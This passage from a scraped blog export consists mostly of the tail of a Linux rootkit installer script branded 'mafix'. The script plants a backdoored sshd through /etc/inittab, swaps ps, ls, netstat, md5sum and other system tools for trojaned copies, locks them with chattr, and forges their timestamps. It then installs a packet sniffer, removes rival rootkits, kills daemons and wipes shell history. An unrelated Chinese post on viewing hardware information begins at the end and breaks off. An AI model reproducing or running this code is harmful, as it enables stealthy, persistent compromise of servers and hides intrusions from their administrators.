/sbin/ttymon</p><p>&nbsp; &nbsp;rm -rf /sbin/ttymon</p><p>fi</p><p>&nbsp;</p><p>mv $SSHDIR/sshd /sbin/ttyload 2&gt;/dev/null</p><p>chmod a+xr /sbin/ttyload 2&gt;/dev/null</p><p>chmod o-w /sbin/ttyload 2&gt;/dev/null</p><p>touch -acmr /bin/ls /sbin/ttyload</p><p>chattr +isa /sbin/ttyload</p><p>kill -9 `pidof ttyload` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>mv $BASEDIR/bin/ttymon /sbin/ttymon 2&gt;/dev/null</p><p>chmod a+xr /sbin/ttymon 2&gt;/dev/null</p><p>touch -acmr /bin/ls /sbin/ttymon</p><p>chattr +isa /sbin/ttymon</p><p>kill -9 `pidof ttymon` &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>cp /bin/bash $SSHDIR</p><p>&nbsp;</p><p># INITTAB SHUFFLING</p><p>&nbsp;</p><p>chattr -isa /etc/inittab</p><p>cat /etc/inittab |grep -v ttyload|grep -v getty &gt; /tmp/.init1</p><p>cat /etc/inittab |grep getty &gt; /tmp/.init2</p><p>echo &quot;# Loading standard ttys&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;0:2345:once:/usr/sbin/ttyload&quot; &gt;&gt; /tmp/.init1</p><p>cat /tmp/.init2 &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# modem getty.&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# mo:235:respawn:/usr/sbin/mgetty -s 38400 modem&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# fax getty (hylafax)&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# mo:35:respawn:/usr/lib/fax/faxgetty /dev/modem&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# vbox (voice box) getty&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# I6:35:respawn:/usr/sbin/vboxgetty -d /dev/ttyI6&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# I7:35:respawn:/usr/sbin/vboxgetty -d /dev/ttyI7&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;# end of /etc/inittab&quot; &gt;&gt; /tmp/.init1</p><p>echo &quot;/sbin/ttyload -q &gt;/dev/null 2&gt;&amp;1&quot; &gt; /usr/sbin/ttyload</p><p>echo &quot;/sbin/ttymon &gt;/dev/null 2&gt;&amp;1&quot; &gt;&gt; /usr/sbin/ttyload</p><p>touch -acmr /bin/ls /usr/sbin/ttyload</p><p>chmod +x /usr/sbin/ttyload 2&gt;/dev/null</p><p>chattr +isa /usr/sbin/ttyload</p><p>/usr/sbin/ttyload &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>touch -amcr /etc/inittab /tmp/.init1</p><p>mv -f /tmp/.init1 /etc/inittab 2&gt;/dev/null</p><p>rm -rf /tmp/.init2</p><p>&nbsp;</p><p># MAKING SURE WE GOT IT BACKDORED RIGHT !</p><p>&nbsp;</p><p>if [ ! &quot;`grep ttyload /etc/inittab`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} inittab broken, sshd wont be loaded upon reboot :(${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p># Say hello to md5sum fixer boys n gurls !</p><p>&nbsp;</p><p>if [ -f /sbin/ifconfig ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /sbin/ifconfig &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /bin/ps ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /bin/ps &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /bin/ls ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /bin/ls &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /bin/netstat ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /bin/netstat &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/find ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/find &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/top ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/top &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/sbin/lsof ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/sbin/lsof &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/slocate ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/slocate &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/dir ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/dir &gt;&gt; .shmd5</p><p>fi</p><p>if [ -f /usr/bin/md5sum ]; then</p><p>&nbsp; &nbsp;/usr/bin/md5sum /usr/bin/md5sum &gt;&gt; .shmd5</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p>if [ ! -f /dev/srd0 ]; then</p><p>&nbsp; ./encrypt -e .shmd5 /dev/srd0</p><p>&nbsp; touch -acmr /bin/ls /dev/srd0</p><p>&nbsp; chattr a+r /dev/srd0</p><p>&nbsp; chown -f root:root /dev/srd0</p><p>fi</p><p>&nbsp;</p><p>rm -rf .shmd5</p><p>&nbsp;</p><p>&nbsp;</p><p># time change bitch</p><p>&nbsp;</p><p>touch -acmr /sbin/ifconfig ifconfig &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /bin/ps ps &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /bin/ls ls &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /bin/netstat netstat &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/find find &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/top top &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/sbin/lsof lsof &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /sbin/syslogd syslogd &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/slocate slocate &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/dir dir &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/md5sum md5sum &gt;/dev/null 2&gt;&amp;1</p><p>touch -acmr /usr/bin/pstree pstree &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>&nbsp;</p><p># Backdoor ps/top/du/ls/netstat/etc..</p><p>&nbsp;</p><p>cd $BASEDIR/bin</p><p>&nbsp;</p><p>BACKUP=/usr/lib/libsh/.backup</p><p>mkdir $BACKUP 2&gt;/dev/null</p><p>&nbsp;</p><p># ps ...</p><p>if [ -f /usr/bin/ps ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/ps</p><p>&nbsp; &nbsp;cp /usr/bin/ps $BACKUP</p><p>&nbsp; &nbsp;mv -f ps /usr/bin/ps 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/ps</p><p>fi</p><p>&nbsp;</p><p>if [ -f /bin/ps ]; then</p><p>&nbsp; &nbsp;chattr -isa /bin/ps</p><p>&nbsp; &nbsp;cp /bin/ps $BACKUP</p><p>&nbsp; &nbsp;mv -f ps /bin/ps 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /bin/ps</p><p>fi</p><p>&nbsp;</p><p># ifconfig ...</p><p>chattr -isa /sbin/ifconfig</p><p>cp /sbin/ifconfig $BACKUP</p><p>mv -f ifconfig /sbin/ifconfig 2&gt;/dev/null</p><p>chattr +isa\n/sbin/ifconfig</p><p>&nbsp;</p><p># netstat ...</p><p>if [ -f /usr/sbin/netstat ]; then</p><p>&nbsp; chattr -isa /usr/sbin/netstat</p><p>&nbsp; mv -f netstat /usr/sbin/netstat 2&gt;/dev/null</p><p>&nbsp; chattr +isa /usr/sbin/netstat</p><p>fi</p><p>&nbsp;</p><p>chattr -isa /bin/netstat</p><p>cp /bin/netstat $BACKUP</p><p>mv -f netstat /bin/netstat 2&gt;/dev/null</p><p>chattr +isa /bin/netstat</p><p>&nbsp;</p><p># top ...</p><p>if [ -f /usr/bin/top ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/top</p><p>&nbsp; &nbsp;cp /usr/bin/top $BACKUP</p><p>&nbsp; &nbsp;mv -f top /usr/bin/top 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/top</p><p>&nbsp; &nbsp;if [ -f /lib/libncurses.so.5 ]; then</p><p>&nbsp; &nbsp; &nbsp; ln -s /lib/libncurses.so.5 /lib/libncurses.so.4 2&gt;/dev/null</p><p>&nbsp; &nbsp;fi</p><p>&nbsp; &nbsp;if [ -f /usr/lib/libncurses.so.5 ]; then</p><p>&nbsp; &nbsp; &nbsp; ln -s /usr/lib/libncurses.so.5 /lib/libncurses.so.4 2&gt;/dev/null</p><p>&nbsp; &nbsp;fi</p><p>fi</p><p>&nbsp;</p><p># slocate ...</p><p>if [ -f /usr/bin/slocate ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/slocate</p><p>&nbsp; &nbsp;cp /usr/bin/slocate $BACKUP</p><p>&nbsp; &nbsp;mv -f slocate /usr/bin/slocate 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/slocate</p><p>fi</p><p>&nbsp;</p><p># ls ...</p><p>chattr -isa /bin/ls</p><p>cp /bin/ls $BACKUP</p><p>mv -f ls /bin/ls 2&gt;/dev/null</p><p>chattr +isa /bin/ls</p><p>&nbsp;</p><p># find ...</p><p>if [ -f /usr/bin/find ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/find</p><p>&nbsp; &nbsp;cp /usr/bin/find $BACKUP</p><p>&nbsp; &nbsp;mv -f find /usr/bin/find 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/find</p><p>fi</p><p>&nbsp;</p><p># dir ...</p><p>if [ -f /usr/bin/dir ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/dir</p><p>&nbsp; &nbsp;cp /usr/bin/dir $BACKUP</p><p>&nbsp; &nbsp;mv -f dir /usr/bin/dir 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/dir</p><p>fi</p><p>&nbsp;</p><p># lsof ...</p><p>if [ -f /usr/sbin/lsof ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/lsof</p><p>&nbsp; &nbsp;cp /usr/sbin/lsof $BACKUP</p><p>&nbsp; &nbsp;mv -f lsof /usr/sbin/lsof 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/sbin/lsof</p><p>fi</p><p>&nbsp;</p><p># pstree ...</p><p>if [ -f /usr/bin/pstree ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/pstree</p><p>&nbsp; &nbsp;cp /usr/bin/pstree $BACKUP</p><p>&nbsp; &nbsp;mv -f pstree /usr/bin/pstree 2&gt;/dev/null</p><p>&nbsp; &nbsp;chattr +isa /usr/bin/pstree</p><p>fi</p><p>&nbsp;</p><p># md5sum ...</p><p>chattr -isa /usr/bin/md5sum</p><p>cp /usr/bin/md5sum $BACKUP</p><p>mv -f md5sum /usr/bin/md5sum 2&gt;/dev/null</p><p>chattr +isa /usr/bin/md5sum</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} backdoored some daemons (netstat, ps)${RES}&quot;</p><p>&nbsp;</p><p>cd $BASEDIR</p><p>&nbsp;</p><p>mkdir $HOMEDIR/.sniff 2&gt;/dev/null</p><p>mv $BASEDIR/bin/shsniff $HOMEDIR/.sniff/shsniff 2&gt;/dev/null</p><p>chmod +x $BASEDIR/bin/sshd 2&gt;/dev/null</p><p>mv $BASEDIR/bin/shp $HOMEDIR/.sniff/shp 2&gt;/dev/null</p><p>mv $BASEDIR/bin/shsb $HOMEDIR/shsb 2&gt;/dev/null</p><p>mv $BASEDIR/bin/hide $HOMEDIR/hide 2&gt;/dev/null</p><p>touch -acmr /bin/ls $HOMEDIR/.sniff/shsniff</p><p>touch -acmr /bin/ls $HOMEDIR/.sniff/shp</p><p>touch -acmr /bin/ls $HOMEDIR/shsb</p><p>touch -acmr /bin/ls $HOMEDIR/hide</p><p>chmod +x $HOMEDIR/.sniff/* 2&gt;/dev/null</p><p>chmod +x $HOMEDIR/shsb 2&gt;/dev/null</p><p>chmod +x $HOMEDIR/hide 2&gt;/dev/null</p><p>./bin/sshd $1 $2 &gt;&gt; /dev/null</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} checking for some vuln daemons....${RES}&quot;</p><p>ps aux &gt; /tmp/.procs</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.procs | grep named`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} NAMED FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/wu.ftpd ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} WU-FTPD FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.procs | grep smbd`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} SAMBA FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.procs | grep rpc.statd`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} RPC.STATD FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>rm -rf /tmp/.procs</p><p>&nbsp;</p><p>netstat -natp &gt; /tmp/.stats</p><p>&nbsp;</p><p>if [ &quot;`cat /tmp/.stats | grep 443 | grep http`&quot; ]; then</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} MOD_SSL FOUND! PATCH IT!${RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>rm -rf /tmp/.stats</p><p>&nbsp;</p><p>&nbsp;</p><p># CHECKING FOR HOSTILE ROOTKITS/BACKDORS</p><p>&nbsp;</p><p>&nbsp;</p><p>mkdir $HOMEDIR/.owned 2&gt;/dev/null</p><p>&nbsp;</p><p>if [ -f /etc/ttyhash ]; then</p><p>&nbsp; &nbsp;chattr -AacdisSu /etc/ttyhash</p><p>&nbsp; &nbsp;rm -rf /etc/ttyhash</p><p>fi</p><p>&nbsp;</p><p>if [ -d /lib/ldd.so ]; then</p><p>&nbsp; &nbsp;chattr -isa /lib/ldd.so</p><p>&nbsp; &nbsp;chattr -isa /lib/ldd.so/*</p><p>&nbsp; &nbsp;mv /lib/ldd.so $HOMEDIR/.owned/tk8</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} tk8 found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/src/.puta ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/src/.puta</p><p>&nbsp; &nbsp;chattr -isa /usr/src/.puta/*</p><p>&nbsp; &nbsp;mv /usr/src/.puta $HOMEDIR/.owned/tk7</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} tk7 found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/xntpd ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/xntpd</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/xntpd</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/nscd ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/sbin/nscd</p><p>&nbsp; &nbsp;rm -rf /usr/sbin/nscd</p><p>fi</p><p>&nbsp;</p><p>if [ -d /usr/include/bex ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/info/termcap.info-5.gz; rm -rf /usr/info/termcap.info-5.gz</p><p>&nbsp; &nbsp;chattr -isa /usr/include/audit.h; rm -rf /usr/include/audit.h</p><p>&nbsp; &nbsp;chattr -isa /usr/include/bex</p><p>&nbsp; &nbsp;chattr -isa /usr/include/bex/*</p><p>&nbsp; &nbsp;mv /usr/include/bex/ $HOMEDIR/.owned/bex2</p><p>&nbsp; &nbsp;if [ -f /var/log/tcp.log ]; then</p><p>&nbsp; &nbsp; &nbsp; chattr -isa /var/log/tcp.log</p><p>&nbsp; &nbsp; &nbsp; cp /var/log/tcp.log $HOMEDIR/.owned/bex2/snifflog</p><p>&nbsp; &nbsp;fi</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/sshd2 &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /usr/bin/sshd2 &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} bex2 found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -d /dev/tux/ ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/xsf &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /usr/bin/xsf &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/xchk &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /usr/bin/xchk &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;chattr -isa /dev/tux &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;mv /dev/tux $HOMEDIR/.owned/tuxkit</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} tuxkit found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/bin/ssh2d ]; then</p><p>&nbsp; &nbsp;chattr -isa /usr/bin/ssh2d</p><p>&nbsp; &nbsp;rm -rf /usr/bin/ssh2d</p><p>&nbsp; &nbsp;chattr -isa /lib/security/.config/</p><p>&nbsp; &nbsp;chattr -isa /lib/security/.config/*</p><p>&nbsp; &nbsp;rm -rf /lib/security/.config</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} optickit found and owned!{RES}&quot;</p><p>fi</p><p>&nbsp;</p><p>if [ -f /etc/ld.so.hash ]; then</p><p>&nbsp; &nbsp;chattr -isa /etc/ld.so.hash</p><p>&nbsp; &nbsp;rm -rf /etc/ld.so.hash</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p>chattr +isa /usr/lib/libsh</p><p>chattr +isa /lib/libsh.so</p><p>&nbsp;</p><p># GREPPING SHITZ FROM rc.sysinit and inetd.conf</p><p>&nbsp;</p><p>if [ -f /etc/rc.d/rc.sysinit ]; then</p><p>&nbsp; &nbsp;chattr -isa /etc/rc.d/rc.sysinit</p><p>&nbsp; &nbsp;cat /etc/rc.d/rc.sysinit | grep -v &quot;# Xntps (NTPv3 daemon) startup..&quot;| grep -v &quot;/us\nr/sbin/xntps&quot;| grep -v &quot;/usr/sbin/nscd&quot; &gt; /tmp/.grep</p><p>&nbsp; &nbsp;chmod +x /tmp/.grep</p><p>&nbsp; &nbsp;touch -acmr /etc/rc.d/rc.sysinit /tmp/.grep</p><p>&nbsp; &nbsp;mv -f /tmp/.grep /etc/rc.d/rc.sysinit</p><p>&nbsp; &nbsp;rm -rf /tmp/.grep</p><p>fi</p><p>&nbsp;</p><p>if [ -f /etc/inetd.conf ]; then</p><p>&nbsp; &nbsp;chattr -isa /etc/inetd.conf</p><p>&nbsp; &nbsp;cat /etc/inetd.conf | grep -v &quot;6635&quot;| grep -v &quot;9705&quot; &gt; /tmp/.grep</p><p>&nbsp; &nbsp;touch -acmr /etc/inted.conf /tmp/.grep</p><p>&nbsp; &nbsp;mv -f /tmp/.grep /etc/inetd.conf</p><p>&nbsp; &nbsp;rm -rf /tmp/.grep</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p># KILLING SOME LAMME DAEMONS</p><p>&nbsp;</p><p>killall -9 -q nscd &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q xntps &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q mountd &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q mserv &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q psybnc &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q t0rns &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q linsniffer &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sniffer &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q lpsched &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sniff &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sn1f &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q sshd2 &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q xsf &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q xchk &gt;/dev/null 2&gt;&amp;1</p><p>killall -9 -q ssh2d &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp; &nbsp;echo &quot;${CYN}mafix!${DMAG} &gt; ${CYN} sysinfo:${RES}&quot;</p><p>MYIPADDR=`/sbin/ifconfig eth0 | grep &quot;inet addr:&quot; | awk -F ' ' ' {print $2} ' | cut -c6-`</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; hostname :${CYN} `hostname -f` ($MYIPADDR)${RES}&quot;</p><p>uname -a | awk '{ print &nbsp;$11 }' &gt;/tmp/info_tmp</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; arch: ${CYN}`cat /tmp/info_tmp` -+- bogomips : `cat /proc/cpuinfo | grep bogomips | awk ' {print $3}'` '${RES}&quot;</p><p>echo &quot;${CYN}mafix!${DMAG} &gt; alternative ip: ${CYN} &quot;`hostname -i`&quot; -+- &nbsp;Might be [&quot;`/sbin/ifconfig | grep eth | wc -l`&quot; ] active adapters.${RES}&quot;</p><p>&nbsp;</p><p>if [ -f /etc/redhat-release ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/redhat-release`${RES}&quot;</p><p>elif [ -f /etc/slackware-version ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/slackware-version`${RES}&quot;</p><p>elif [ -f /etc/debian_version ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/debian_version`${RES}&quot;</p><p>elif [ -f /etc/SuSE-release ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/SuSE-release`${RES}&quot;</p><p>elif [ -f /etc/issue ]; then</p><p>&nbsp; &nbsp; echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} `head -1 /etc/issue`${RES}&quot;</p><p>else echo -n &quot;${CYN}mafix!${DMAG} &gt; dist: ${CYN} unknown${RES}&quot;</p><p>fi</p><p>echo</p><p>echo -n &quot;${CYN}mafix!${DMAG} &gt; cleaning up some traces... ${RES}&quot;</p><p>unset HISTFILE;unset HISTSIZE;unset HISTORY;unset HISTSAVE;unset HISTFILESIZE</p><p>if [ -f /.bash_history ]; then</p><p>&nbsp; &nbsp;chattr -isa /.bash_history &gt;/dev/null 2&gt;&amp;1</p><p>&nbsp; &nbsp;rm -rf /.bash_history</p><p>fi</p><p>&nbsp;</p><p>if [ -f /bin/.bash_history ]; then</p><p>&nbsp; &nbsp;chattr -isa /bin/.bash_history</p><p>&nbsp; &nbsp;rm -rf /bin/.bash_history</p><p>fi</p><p>cd $BASEDIR</p><p>rm -rf /tmp/.r*</p><p>cd ..</p><p>rm -rf mafix*</p><p>echo -n &quot;${CYN}done!${RES}&quot;</p><p>echo</p><p>rm -rf /tmp/info_tmp</p><p>endtime=`date +%S`</p><p>echo</p><p>echo</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ___ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; &nbsp;___ &nbsp; &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; /__/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; &nbsp; &nbsp; &nbsp; / &nbsp;/ &nbsp; ${DMAG} &nbsp; ___ &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; /__/| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:: &nbsp; &nbsp; &nbsp; / &nbsp;/:: &nbsp; &nbsp; &nbsp; / &nbsp;/:/_ &nbsp;${DMAG} &nbsp;/ &nbsp;/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;| &nbsp;|:|: &nbsp; &nbsp; / &nbsp;/:/: &nbsp; &nbsp; / &nbsp;/:/ / ${DMAG} / &nbsp;/:/ &nbsp; &nbsp;${CYN} &nbsp; &nbsp;| &nbsp;|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;__|__|:|: &nbsp; / &nbsp;/:/~/:: &nbsp; / &nbsp;/:/ /:/ ${DMAG}/__/:: &nbsp; &nbsp;${CYN} &nbsp;__|__|:| &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${CYN} /__/::::| : /__/:/ /:/: /__/:/ /:/ &nbsp;${DMAG}__/:__ ${CYN} /__/::::____${RES}&quot;</p><p>echo &quot;${CYN}  &nbsp;:~~__/  &nbsp;:/:/__/  &nbsp;:/:/ &nbsp; ${DMAG} &nbsp;  &nbsp;:/ ${CYN} &nbsp; ~~~::::/${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;::/ &nbsp; &nbsp; &nbsp;  &nbsp;::/ &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;__::/${CYN} &nbsp; &nbsp; |~~|:|~~ ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp;  &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp;${DMAG} &nbsp; &nbsp;/__/:/ ${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;: &nbsp; ${DMAG} &nbsp; &nbsp;__/ &nbsp;${CYN} &nbsp; &nbsp; | &nbsp;|:| &nbsp; ${RES}&quot;</p><p>echo &quot;${CYN} &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; &nbsp; &nbsp; &nbsp; __/ &nbsp; ${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ${CYN} &nbsp; &nbsp; |__|/ &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${DMAG}${RES}&quot;</p><p>echo &quot;${DMAG} &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Password: $1 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;${RES}&quot;</p><p>echo &quot;${DMAG} &nbsp;  &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Port: $2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;${RES}&quot;</p><p>&nbsp;</p><p>if [ -f /usr/sbin/syslogd ]; then</p><p>&nbsp; &nbsp;/usr/sbin/syslogd -m 0</p><p>else</p><p>&nbsp; &nbsp;/sbin/syslogd -m 0</p><p>fi</p><p>&nbsp;</p><p>if [ -f /usr/sbin/inetd ]; then</p><p>&nbsp; &nbsp;killall -HUP inetd &gt;/dev/null 2&gt;&amp;1</p><p>elif [ -f /usr/sbin/xinetd ]; then</p><p>&nbsp; &nbsp;killall -HUP xinetd</p><p>fi</p><p>&nbsp;</p><p>&nbsp;</p><p></p>"},{"title":"linux应用--硬件信息查看[转]","date":"2010-12-08T14:38:00.000Z","_content":"<p></p><p></p> <ins><ins></ins></ins> <p>linux应用--硬件信息查看</p><p>真乱---整理下、、、<br />1, 主板信息 .查看主板的序列号 -------------------------------------------------- #使用<a href=\"http://www.net527.cn/a/luyoujiaohuan/\"><u>命令</u></a> dmidecode | grep -i 'serial number' #查看板卡信息 cat /proc/pci --------------------------------------------------</p><p>2, cpu信息 